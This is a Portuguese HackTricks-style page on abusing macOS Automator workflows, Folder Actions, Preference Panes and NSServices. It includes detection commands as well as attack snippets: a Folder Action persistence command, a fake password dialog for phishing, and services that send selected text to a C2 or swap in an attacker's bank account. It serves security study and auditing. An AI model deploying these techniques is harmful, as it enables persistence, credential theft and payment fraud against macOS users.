# Abuso do macOS Automator, Preference Panes e NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions e Workflows

### Informações básicas

O **Automator** é a ferramenta visual de automação do macOS. Ele executa **workflows** (bundles `.workflow`) compostos por **actions** (bundles `.action`). O Automator também fornece suporte para **Folder Actions**, **Quick Actions** e integração com **Shortcuts**. Nas versões modernas do macOS, workflows também podem ser **importados para o Shortcuts**, portanto a mesma lógica maliciosa pode aparecer como uma Quick Action do Finder, um user service em `~/Library/Services/` ou um shortcut baseado em Automator actions legadas.

As Automator actions são **plugins** carregados no runtime do Automator quando um workflow é executado. Elas podem:
- Executar shell scripts arbitrários
- Processar arquivos e dados
- Interagir com aplicativos via AppleScript
- Encadear-se para criar automações complexas

### Por que isso importa

> [!WARNING]
> Workflows do Automator podem ser executados por meio de **engenharia social** — eles parecem simples arquivos de documentos. Um bundle `.workflow` pode conter comandos shell incorporados que são executados quando o workflow é iniciado. Combinados com Folder Actions, eles fornecem **persistência automática** acionada por eventos de arquivos. Correções recentes no Gatekeeper também demonstraram que **Quick Actions agrupadas em apps** (`Contents/PlugIns/*.workflow`) devem ser tratadas como conteúdo executável, não como dados inofensivos.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Um pacote `.workflow` parece um arquivo de documento normal para a maioria dos usuários:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions executam automaticamente um workflow quando arquivos são adicionados a uma pasta monitorada:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistem após reinicializações e são executadas silenciosamente. Uma Folder Action em `~/Downloads` significa que **cada arquivo baixado aciona seu payload** — incluindo arquivos do Safari, Chrome, AirDrop e anexos de e-mail. Observe também que o `System Events` pode registrar Folder Actions que apontam para scripts fora dos locais padrão `~/Library/Scripts/Folder Action Scripts`, o que torna útil procurar por caminhos dispersos. Para obter informações relacionadas às implicações de TCC, consulte [a página sobre TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Informações básicas

Os painéis de preferências (`.prefPane bundles`) são plugins carregados pelo **System Settings** (anteriormente System Preferences). Eles fornecem painéis de UI de configuração para recursos do sistema ou de terceiros. Em sistemas mais antigos, eram carregados diretamente pelo `System Preferences`; em versões mais recentes, os painéis de terceiros normalmente são intermediados por um **legacy loader XPC service** iniciado pelo System Settings.

### Por que isso importa

- Preference panes são executados em um **processo host confiável** iniciado pelo System Settings / System Preferences
- Em sistemas modernos, esse host pode ser um **serviço XPC `legacyLoader`**, portanto o limite importante continua sendo **processo de UI confiável da Apple -> carregamento de código de terceiros**
- Preference panes de terceiros herdam o **contexto de segurança do processo host** e a confiança do usuário associada a essa UI
- Usuários instalam preference panes clicando duas vezes neles — uma oportunidade fácil para engenharia social
- Depois de instalados, eles **persistem** e são carregados sempre que o System Settings abre esse painel

### Descoberta
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Um preference pane malicioso herda o **contexto de segurança do host do pane** (historicamente, `System Preferences`; em versões mais recentes, geralmente um helper `legacyLoader` iniciado pelo `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Ataque: Persistência via Instalação
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Ataque: UI Phishing

Um painel de preferências pode imitar painéis legítimos da interface do sistema para **phishing de credenciais**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informações básicas

**NSServices** permitem que os aplicativos forneçam funcionalidades a outros apps por meio do **menu Services** (clique com o botão direito → Services). Quando um usuário seleciona texto ou dados e invoca um serviço, os dados selecionados são **enviados ao provedor do serviço** para processamento.

Os serviços são declarados no `Info.plist` de um aplicativo sob a chave `NSServices` e registrados no servidor pasteboard (`pbs`). O macOS também mantém um **cache de serviços** e uma **política de restrição** que determinam quais serviços ficam visíveis e se os chamadores em sandbox devem receber um aviso adicional.

### Por que isso importa

- Os serviços recebem **fluxo de dados entre aplicativos** — o texto selecionado em qualquer aplicativo é enviado ao serviço
- Um serviço malicioso captura dados de gerenciadores de senhas, clientes de e-mail e aplicativos financeiros
- Os serviços podem **retornar dados modificados** ao aplicativo chamador (man-in-the-middle em operações de seleção)
- Os nomes dos serviços podem ser criados para parecer legítimos ("Format Text", "Encrypt Selection", "Share")
- A flag opcional `NSRestricted` é relevante para a segurança: um serviço marcado como irrestrito pode ser chamado por um app em sandbox sem o aviso exibido pelo macOS para serviços que podem facilitar escapes<sup>[2]</sup>

### Descoberta
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Ataque: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Ataque: Modificação de dados (Man-in-the-Middle)

Um serviço pode **modificar os dados retornados** enquanto aparenta fornecer uma função legítima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

A Apple oferece suporte a um booleano `NSRestricted` opcional por definição de serviço. Quando definido, o macOS alerta os chamadores em sandbox, pois o serviço pode ajudá-los a **escapar dos limites da sandbox ou de privacidade**. De uma perspectiva ofensiva, isso fornece dois caminhos úteis de auditoria:

- Procurar **serviços de terceiros não marcados como restricted**, embora façam proxy de Apple Events, acesso a arquivos ou outras ações privilegiadas
- Procurar **serviços integrados de alto valor** com entitlements fortes (por exemplo, serviços expostos pelo Script Editor ou por helpers associados ao Finder) e verificar se a interação do usuário é suficiente para transformá-los em uma primitiva de acesso a dados

Um bom exemplo recente é o **CVE-2022-48574**, no qual o mecanismo de Services podia ser abusado para alcançar **arquivos de usuário protegidos pelo TCC sem o fluxo de confirmação esperado**. O bug foi corrigido, mas a técnica continua útil para threat modeling: qualquer serviço que encaminhe solicitações de acesso a arquivos ou de automação em nome do chamador merece o mesmo nível de análise.<sup>[2]</sup>

---

## Recent Security Notes

- **Quick Actions são conteúdo executável**: a Apple corrigiu um bypass do Gatekeeper em 2024, no qual uma Quick Action do Automator incluída em um app podia ser executada sem a avaliação normal. Ao auditar apps, inspecione `Contents/PlugIns/*.workflow/Contents/document.wflow` exatamente como você inspecionaria helper scripts ou login items. Consulte [a página do Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
- **Shortcuts podem herdar o comportamento legado do Automator**: a Apple também adicionou um prompt adicional de consentimento do usuário depois que shortcuts de terceiros foram encontrados usando uma **legacy Automator action** para enviar Apple Events sem o fluxo de permissões esperado. Workflows importados e bundles de shortcuts devem ser analisados em busca de `Run AppleScript`, `Run Shell Script` e ações de bridge semelhantes. Consulte [a página do TCC](../macos-security-protections/macos-tcc/README.md).
- **O Automator ainda é um limite de privacidade ativo**: a Apple lançou outra correção para o Automator em 2025, relacionada ao acesso a dados de usuário protegidos. Mesmo que o Automator seja uma superfície legada, trate qualquer workflow runner, host de Quick Action ou bridge de automação como uma superfície de ataque atual, e não como código morto.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Painel de Preferências → Escalada de TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Roubo de Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referências

- [1] [Apple — Sobre o conteúdo de segurança do macOS Ventura 13.7, Sonoma 14.7 e Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Como funcionava o exploit NSServices no macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
